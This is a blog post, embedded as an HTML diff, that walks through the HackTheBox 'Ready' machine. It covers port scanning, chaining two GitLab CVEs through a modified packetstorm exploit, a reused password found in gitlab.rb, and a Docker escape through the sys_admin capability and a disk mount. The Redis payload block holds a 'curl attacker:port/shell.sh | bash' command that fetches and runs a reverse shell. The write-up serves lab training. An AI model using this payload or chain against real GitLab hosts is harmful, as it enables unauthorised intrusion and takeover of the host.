@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Ready Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Ready Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Ready Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Ready is a Linux based machine that was active since December 12th of 2020 to May 15th of 2021, on this machine we will exploit two vulnerabilities on Gitlab that chained together will allow us to get command execution on the machine, looking at the configuration files we will find the password of root user, but we will find out that we are inside a Docker container, finally we will escape from the container thanks to sys_admin capability." />
+<meta property="og:description" content="Ready is a Linux based machine that was active since December 12th of 2020 to May 15th of 2021, on this machine we will exploit two vulnerabilities on Gitlab that chained together will allow us to get command execution on the machine, looking at the configuration files we will find the password of root user, but we will find out that we are inside a Docker container, finally we will escape from the container thanks to sys_admin capability." />
+<link rel="canonical" href="http://localhost:8000/Ready" />
+<meta property="og:url" content="http://localhost:8000/Ready" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/ready/ready.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-15T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/ready/ready.png" />
+<meta property="twitter:title" content="Ready Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-05-15T00:00:00-05:00","datePublished":"2021-05-15T00:00:00-05:00","description":"Ready is a Linux based machine that was active since December 12th of 2020 to May 15th of 2021, on this machine we will exploit two vulnerabilities on Gitlab that chained together will allow us to get command execution on the machine, looking at the configuration files we will find the password of root user, but we will find out that we are inside a Docker container, finally we will escape from the container thanks to sys_admin capability.","headline":"Ready Writeup [HTB]","image":"http://localhost:8000/assets/images/ready/ready.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Ready"},"url":"http://localhost:8000/Ready"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/ready/ready.png/../banner.png>
+  
+  <h2>Ready Writeup [HTB]</h2>
+  <time datetime="2021-05-15T00:00:00-05:00" class="by-line">15 May 2021</time>
+  <p>Ready is a Linux based machine that was active since December 12th of 2020 to May 15th of 2021, on this machine we will exploit two vulnerabilities on Gitlab that chained together will allow us to get command execution on the machine, looking at the configuration files we will find the password of root user, but we will find out that we are inside a Docker container, finally we will escape from the container thanks to sys_admin capability.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.220
+nmap -sC -sV -p 22,5080, -Pn -o scan.txt 10.10.10.220
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+5080/tcp open  http    nginx
+| http-robots.txt: 53 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.220:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>We find two ports open, ssh and a webpage on port 5080, this site is running gitlab, so to access to it we register an account</p>
+
+<p><img src="/assets/images/ready/register.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>There are two CVEs (2018-19585 and 2018-19571) that together would allow us to get command execution on the machine if the gitlab version is vulnerable to it, we can find a <a href="https://www.exploit-db.com/exploits/49334">PoC</a> on exploitdb for it, but on this case I used one available on <a href="https://packetstormsecurity.com/files/160699/GitLab-11.4.7-Remote-Code-Execution.html">packetstorm</a>, there is some changes that we need to make, first on the line that says <code class="language-plaintext highlighter-rouge">local_port = args.p</code>, we have to change it for <code class="language-plaintext highlighter-rouge">local_port = args.P</code> (note the uppercase), and we modify:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">form</span> <span class="o">=</span> <span class="sh">"""</span><span class="se">\n</span><span class="s">multi
+    sadd resque:gitlab:queues system_hook_push
+    lpush resque:gitlab:queue:system_hook_push </span><span class="sh">"</span><span class="s">{</span><span class="se">\\</span><span class="sh">"</span><span class="s">class</span><span class="se">\\</span><span class="sh">"</span><span class="s">:</span><span class="se">\\</span><span class="sh">"</span><span class="s">GitlabShellWorker</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">args</span><span class="se">\\</span><span class="sh">"</span><span class="s">:[</span><span class="se">\\</span><span class="sh">"</span><span class="s">class_eval</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">open(</span><span class="se">\\</span><span class="sh">'</span><span class="s">|</span><span class="sh">"""</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">nc </span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">"""</span><span class="s"> </span><span class="se">\\</span><span class="sh">'</span><span class="s">).read</span><span class="se">\\</span><span class="sh">"</span><span class="s">],</span><span class="se">\\</span><span class="sh">"</span><span class="s">retry</span><span class="se">\\</span><span class="sh">"</span><span class="s">:3,</span><span class="se">\\</span><span class="sh">"</span><span class="s">queue</span><span class="se">\\</span><span class="sh">"</span><span class="s">:</span><span class="se">\\</span><span class="sh">"</span><span class="s">system_hook_push</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">jid</span><span class="se">\\</span><span class="sh">"</span><span class="s">:</span><span class="se">\\</span><span class="sh">"</span><span class="s">ad52abc5641173e217eb2e52</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">created_at</span><span class="se">\\</span><span class="sh">"</span><span class="s">:1608799993.1234567,</span><span class="se">\\</span><span class="sh">"</span><span class="s">enqueued_at</span><span class="se">\\</span><span class="sh">"</span><span class="s">:1608799993.1234567}</span><span class="sh">"</span><span class="s">
+    exec
+    exec
+    exec</span><span class="se">\n</span><span class="sh">"""</span>
+</code></pre></div></div>
+
+<p>for:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">form</span> <span class="o">=</span> <span class="sh">"""</span><span class="se">\n</span><span class="s">multi
+    sadd resque:gitlab:queues system_hook_push
+    lpush resque:gitlab:queue:system_hook_push </span><span class="sh">"</span><span class="s">{</span><span class="se">\\</span><span class="sh">"</span><span class="s">class</span><span class="se">\\</span><span class="sh">"</span><span class="s">:</span><span class="se">\\</span><span class="sh">"</span><span class="s">GitlabShellWorker</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">args</span><span class="se">\\</span><span class="sh">"</span><span class="s">:[</span><span class="se">\\</span><span class="sh">"</span><span class="s">class_eval</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">open(</span><span class="se">\\</span><span class="sh">'</span><span class="s">|</span><span class="sh">"""</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">curl </span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="s">/shell.sh | bash</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">"""</span><span class="s"> </span><span class="se">\\</span><span class="sh">'</span><span class="s">).read</span><span class="se">\\</span><span class="sh">"</span><span class="s">],</span><span class="se">\\</span><span class="sh">"</span><span class="s">retry</span><span class="se">\\</span><span class="sh">"</span><span class="s">:3,</span><span class="se">\\</span><span class="sh">"</span><span class="s">queue</span><span class="se">\\</span><span class="sh">"</span><span class="s">:</span><span class="se">\\</span><span class="sh">"</span><span class="s">system_hook_push</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">jid</span><span class="se">\\</span><span class="sh">"</span><span class="s">:</span><span class="se">\\</span><span class="sh">"</span><span class="s">ad52abc5641173e217eb2e52</span><span class="se">\\</span><span class="sh">"</span><span class="s">,</span><span class="se">\\</span><span class="sh">"</span><span class="s">created_at</span><span class="se">\\</span><span class="sh">"</span><span class="s">:1608799993.1234567,</span><span class="se">\\</span><span class="sh">"</span><span class="s">enqueued_at</span><span class="se">\\</span><span class="sh">"</span><span class="s">:1608799993.1234567}</span><span class="sh">"</span><span class="s">
+    exec
+    exec
+    exec</span><span class="se">\n</span><span class="sh">"""</span>
+</code></pre></div></div>
+
+<p>As usual shell.sh contains a bash reverse shell command, I set up a http server with python and a listener, then run <code class="language-plaintext highlighter-rouge">python3 gitexpl.py -u &lt;username&gt; -p &lt;password&gt; -g http://10.10.10.220 -l 10.10.14.205 -P 8000</code> and we will get a shell in the machine.</p>
+
+<p><img src="/assets/images/ready/shell1.png" alt="" /></p>
+
+<p>This user also can read the file user.txt located at /home/dude</p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>According to the machines one of the first thing I do is look for configuration files, so after a quick check to the <a href="https://docs.gitlab.com/omnibus/settings/configuration.html">docs</a>, we find out that the configuration file for gitlab is “gitlab.rb”, so let’s search for all the copies of this file that we can read (looking for files that you can’t read at the moment can be worth for further steps though, I just make it for cleaner output and move on faster if I can’t access to them).</p>
+
+<p><img src="/assets/images/ready/findgit.png" alt="" /></p>
+
+<p>There are a couple of them, but most of them were modified over 2 years ago, so the one that caught our attention is the one located at /opt/backup. gitlab.rb is a huge configuration file, but we know that the commented lines start with “#”, so let’s grep for the configurations that are in place at the moment, <code class="language-plaintext highlighter-rouge">grep -v "^#" /opt/backup/gitlab.rb | grep -v "^$"</code></p>
+
+<p><img src="/assets/images/ready/grep.png" alt="" /></p>
+
+<p>We found a smtp password, this password is also the password of root user.</p>
+
+<p><img src="/assets/images/ready/root1.png" alt="" /></p>
+
+<h1 id="docker-escape"><a href="#header-1"></a>Docker Escape</h1>
+
+<p>We are root, but we haven’t finished yet, since after exploring the machine we find out that we are inside a Docker container, so we check the capabilities of the container.</p>
+
+<p><img src="/assets/images/ready/capsh.png" alt="" /></p>
+
+<p>We see that the have the sys_admin capability, if the check the <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">manual</a> this allows us to mount disks on the machine, so let’s see the available disks with fdisk, there we see /dev/sda.</p>
+
+<p><img src="/assets/images/ready/devsda.png" alt="" /></p>
+
+<p>Knowing that we can create a directory, mount it there and access to the host system.</p>
+
+<p><img src="/assets/images/ready/root2.png" alt="" /></p>
+
+<p>We could use chroot to interact like we are inside the machine, download root ssh key, add our own key, modify the shadow file, and a lot of other methods if we want a direct access to the machine.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#docker"> Docker</a> &nbsp;
+  
+  <a href="/tags.html#gitlab"> Gitlab</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
